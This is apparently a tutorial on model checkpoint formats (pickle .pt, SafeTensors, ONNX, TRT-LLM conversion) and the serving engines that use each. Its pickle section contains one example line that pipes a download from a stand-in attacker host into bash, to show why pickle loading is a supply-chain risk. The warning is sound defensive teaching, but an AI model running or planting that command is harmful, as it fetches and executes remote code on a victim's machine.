# Format Conversion

Before you can optimize or serve a model, you need to understand what you
actually have at the end of training and what each serving engine expects.

---

## What You Have at the End of Training

At the end of a PyTorch training run, you typically call:

```python
torch.save({
    'epoch': 42,
    'model_state_dict': model.state_dict(),
    'optimizer_state_dict': optimizer.state_dict(),
    'loss': 0.042,
}, "checkpoint.pt")
```

### What `state_dict` contains

`model.state_dict()` returns a Python `OrderedDict` mapping layer names to
weight tensors:

```python
{
    'transformer.h.0.attn.c_attn.weight': tensor([...]),  # shape (3*d, d)
    'transformer.h.0.attn.c_attn.bias':   tensor([...]),  # shape (3*d,)
    'transformer.h.0.attn.c_proj.weight': tensor([...]),
    'transformer.h.0.mlp.c_fc.weight':    tensor([...]),
    'transformer.h.0.mlp.c_proj.weight':  tensor([...]),
    'transformer.h.0.ln_1.weight':        tensor([...]),
    'transformer.h.0.ln_1.bias':          tensor([...]),
    ...  # one block per layer, repeated N times
    'transformer.ln_f.weight':            tensor([...]),
    'lm_head.weight':                     tensor([...]),
}
```

This is **weights only** — it captures the learned parameters of every layer.
It does NOT capture the compute graph (which ops to run, in what order).
To load the weights, you still need the original Python class definition.

### What the full checkpoint adds

The full checkpoint (with optimizer state, epoch, loss) also contains:

```python
optimizer_state_dict = {
    'state': {
        0: {'step': 1000, 'exp_avg': tensor([...]),    # Adam m1 (same shape as param)
                          'exp_avg_sq': tensor([...])}, # Adam m2 (same shape as param)
        1: { ... },
        ...  # one entry per parameter
    },
    'param_groups': [{'lr': 1e-4, 'betas': (0.9, 0.999), ...}]
}
```

For a 7B model in BF16:
```
model weights:      14 GB
Adam optimizer:     28 GB  (m1 + m2, often in FP32 = 4 bytes × 2 × 7B params)
─────────────────────────
full checkpoint:    42 GB
inference needs:    14 GB
```

**For inference, you only need `model_state_dict`.**

---

## What is Pickle

`.pt` files use Python's `pickle` module for serialization. Pickle converts any
Python object (including tensors, dicts, class instances) into a binary byte stream.

### How pickle works

```python
import pickle

data = {'weights': [1.0, 2.0, 3.0], 'layer': 'attn'}

# Serialize: Python object → bytes
with open("data.pkl", "wb") as f:
    pickle.dump(data, f)

# Deserialize: bytes → Python object (EXECUTES CODE)
with open("data.pkl", "rb") as f:
    data = pickle.load(f)    # ← this runs Python code embedded in the file
```

### Why pickle is a problem in production

Pickle is not a data format — it is a **code serialization format**. A pickle
file can contain arbitrary Python code that executes on `load()`. This is a
supply chain attack vector:

```python
# A malicious .pt file could contain:
import os; os.system("curl attacker.com | bash")
# This runs automatically when you call torch.load("malicious_model.pt")
```

Additionally, pickle requires the original Python class to be importable at
load time. If you move to a different codebase or Python version, loading fails.

---

## SafeTensors Format

SafeTensors (by HuggingFace) solves the pickle problem. It is the standard
format for HuggingFace model hub checkpoints.

### Structure

A `.safetensors` file is:
```
[ 8 bytes: header length (uint64) ]
[ N bytes: JSON header            ]
[ raw tensor bytes (no padding)   ]
```

The JSON header:
```json
{
  "transformer.h.0.attn.c_attn.weight": {
    "dtype": "BF16",
    "shape": [2304, 768],
    "data_offsets": [0, 3538944]
  },
  "transformer.h.0.attn.c_attn.bias": {
    "dtype": "BF16",
    "shape": [2304],
    "data_offsets": [3538944, 3543552]
  },
  ...
}
```

Tensor data follows the header as raw bytes, in the order declared.

### Key properties

**No code execution**: the file is pure data — JSON header + raw bytes.
There is no Python embedded. Loading cannot run arbitrary code.

**Memory-mapped loading**: the file is mapped directly into virtual memory.
The OS loads only the pages you actually access. Loading a 14GB model takes
milliseconds for the file open; only the pages you touch are read from disk.

```python
# Standard load: copies entire file into RAM (slow for large models)
state_dict = torch.load("model.pt")     # reads 14GB sequentially

# SafeTensors: memory-mapped (near-instant open, lazy page faults)
from safetensors.torch import load_file
state_dict = load_file("model.safetensors")   # OS maps the file, reads on demand
```

**Cross-language**: the format is defined in Rust (with Python, JS, C++ bindings).
Same file readable from any language without PyTorch.

**How to save:**

```python
from safetensors.torch import save_file

save_file(model.state_dict(), "model.safetensors")
```

### What safetensors does NOT solve

It is still **weights only** — same as `state_dict`. The compute graph
(which ops run in what order) is not captured. Loading still requires the
Python class definition to reconstruct the model.

```python
from safetensors.torch import load_file

model = MyTransformerModel(config)       # class still needed
model.load_state_dict(load_file("model.safetensors"))
```

---

## ONNX Format

ONNX (Open Neural Network Exchange) solves a different problem: it captures
both the **compute graph** and the **weights** in a single hardware-agnostic
file.

### What ONNX captures

```
model.py (Python class + forward())
model.safetensors (weights)
          │
          ▼  torch.onnx.export()
          │  (traces the forward pass with a dummy input)
          ▼
model.onnx
  ├── graph: sequence of ops (MatMul, LayerNorm, Softmax, ...)
  │          with input/output tensor names and shapes
  └── weights: all learned parameters embedded in the graph as constants
```

The ONNX file is a **frozen, self-contained description of the computation**.
You do not need the Python class to run it.

### What an ONNX file looks like

ONNX uses Protocol Buffers. Simplified view of the graph structure:

```
graph {
  node {
    op_type: "MatMul"
    input:  ["input_0", "transformer.h.0.attn.c_attn.weight"]
    output: ["matmul_0_out"]
  }
  node {
    op_type: "Add"
    input:  ["matmul_0_out", "transformer.h.0.attn.c_attn.bias"]
    output: ["add_0_out"]
  }
  node {
    op_type: "Reshape"
    input:  ["add_0_out", "shape_0"]
    output: ["reshape_0_out"]
  }
  node {
    op_type: "Softmax"
    input:  ["reshape_0_out"]
    output: ["softmax_0_out"]
    attribute { name: "axis" i: -1 }
  }
  ...
  initializer {
    name: "transformer.h.0.attn.c_attn.weight"
    data_type: FLOAT16
    dims: [2304, 768]
    raw_data: <binary weight bytes>
  }
  ...
}
```

Every op is a standard ONNX opset node. Every weight is an "initializer"
(a constant tensor embedded in the graph).

### How to export

```python
import torch

model = MyTransformerModel(config).eval()
dummy_input = torch.randn(1, 32, 768)   # (batch, seq_len, d_model)

torch.onnx.export(
    model,
    dummy_input,
    "model.onnx",
    input_names=["input"],
    output_names=["output"],
    dynamic_axes={                        # mark variable dimensions
        "input":  {0: "batch", 1: "seq_len"},
        "output": {0: "batch", 1: "seq_len"},
    },
    opset_version=17,
    do_constant_folding=True,            # pre-compute compile-time constants
)
```

`torch.onnx.export` traces the forward pass with `dummy_input` and records
every op that runs. The trace is then serialized as ONNX protobuf.

### What ONNX enables

Since ONNX is hardware-agnostic:
- **ONNX Runtime**: run on CPU, CUDA, DirectML (Windows GPU), CoreML (Apple)
- **TensorRT (core)**: parse ONNX → build compiled .engine
- **OpenVINO**: Intel hardware
- **Mobile / Edge**: CoreML, TFLite (via converter)

### What ONNX does NOT do for LLMs

For large LLMs (7B+), ONNX export becomes impractical:
- The ONNX graph can be hundreds of thousands of nodes
- Export can take hours and produce files of 10s of GBs
- ONNX's standard ops don't express fused attention (FlashAttention) natively
- TRT-LLM bypasses ONNX entirely for this reason

---

## TRT-LLM `convert_checkpoint.py`

TRT-LLM's own conversion path — specific to LLMs, bypasses ONNX.

### Why not ONNX for LLMs

TRT-LLM adds LLM-specific plugins at build time:
- `gpt_attention_plugin`: fused QKV projection + FlashAttention + KV cache
- `gemm_plugin`: matmul tuned for LLM weight matrix shapes

These plugins are not standard ONNX ops. TRT-LLM cannot build from an ONNX
file — it needs weights in its own layout so it can attach plugin logic around them.

### What `convert_checkpoint.py` does

Takes a HuggingFace safetensors checkpoint and restructures the weights into
TRT-LLM's internal layout:

```
HuggingFace layout (per layer):
  attn.q_proj.weight   shape: (d_model, d_model)
  attn.k_proj.weight   shape: (d_kv,    d_model)
  attn.v_proj.weight   shape: (d_kv,    d_model)
  → stored as three separate tensors

TRT-LLM layout (per layer):
  attention.qkv.weight shape: (d_model + 2*d_kv, d_model)
  → Q, K, V concatenated into one tensor
  → allows fused QKV projection in one matmul (one kernel, one HBM read of input)
```

It also handles:
- Quantization (INT8, FP8 scaling factors computed and stored)
- TP sharding (split weights across ranks if TP > 1)
- Vocabulary embedding padding (pad vocab size to multiple of 64 for alignment)

```bash
python TensorRT-LLM/examples/llama/convert_checkpoint.py \
    --model_dir   /path/to/meta-llama/Llama-3-8B-Instruct \
    --output_dir  /tmp/llama3-8b-trtllm-ckpt \
    --dtype       float16 \
    --tp_size     2          # shard across 2 GPUs if using TP=2
```

Output: `config.json` + `rank0.safetensors` + `rank1.safetensors` (one per GPU rank).

### Then `trtllm-build`

Takes the converted checkpoint and compiles it into a `.engine`:

```bash
trtllm-build \
    --checkpoint_dir /tmp/llama3-8b-trtllm-ckpt \
    --output_dir     /tmp/llama3-8b-engine \
    --gemm_plugin    float16 \
    --gpt_attention_plugin float16 \
    --max_batch_size 32 \
    --max_input_len  2048 \
    --max_output_len 512
```

Output: `rank0.engine` + `rank1.engine` — compiled binary artifacts with all
kernels fused and selected for this specific GPU model and shape configuration.

---

## Summary — Format Comparison

| Format | Captures | Requires class? | Code exec risk | Portable | Used for |
|--------|----------|----------------|---------------|----------|---------|
| `.pt` (pickle) | weights only | yes | yes (pickle) | PyTorch only | training checkpoints |
| `.safetensors` | weights only | yes | no | Python, Rust, JS, C++ | HF hub, vLLM input |
| `.onnx` | graph + weights | no | no | any ONNX runtime | TRT core, ORT, edge |
| TRT-LLM ckpt | weights (restructured) | no | no | TRT-LLM only | trtllm-build input |
| `.engine` | compiled binary | no | no | GPU-model specific | TRT-LLM serving |

## Which Conversion Path for Which Engine

```
vLLM / SGLang
  safetensors → load directly
  No conversion step.

TensorRT-LLM (LLMs)
  safetensors → convert_checkpoint.py → trtllm-build → .engine
  No ONNX involved.

TensorRT core (non-LLM models: vision, classification)
  PyTorch → torch.onnx.export() → ONNX → trt.OnnxParser → .engine
  ONNX is the intermediate.

ONNX Runtime (non-NVIDIA or cross-platform)
  PyTorch → torch.onnx.export() → ONNX → onnxruntime.InferenceSession
```
